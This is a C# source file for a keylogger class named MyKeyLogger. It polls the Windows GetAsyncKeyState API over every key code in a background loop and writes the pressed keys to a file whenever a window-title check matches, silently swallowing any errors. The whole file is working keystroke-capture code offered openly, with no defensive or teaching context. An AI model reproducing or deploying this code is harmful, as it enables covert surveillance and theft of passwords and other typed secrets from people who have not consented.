using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace sys5_KeyLogger
{
	public class MyKeyLogger
	{
		[DllImport("user32.dll")]
		public static extern int GetAsyncKeyState(Int32 i);

		public bool Enabled { get; set; }

		public WindowTitleChecker wtc;

		public MyKeyLogger()
		{
			Enabled = false;
		}

		public MyKeyLogger(WindowTitleChecker windowTitleChecker) : this()
		{
			wtc = windowTitleChecker;
		}

		public void Start()
		{
			Enabled = true;
			Task.Run(() => loop());
		}
		public void loop()
		{
			while (Enabled)
			{
				try
				{
					if (wtc != null && wtc.Check())
					{
						for (Int32 i = 0; i < 255; i++)
						{
							int state = GetAsyncKeyState(i);
							if (state == 1 || state == -32767)
							{
								Log.ToFile($"{(Keys)i} ");
							}
						}
					}
				}
				catch (Exception ex)
				{
					
				}
				Thread.Sleep(100);
			}
		}
		public void Stop()
		{
			Enabled = false;
		}
	}
}
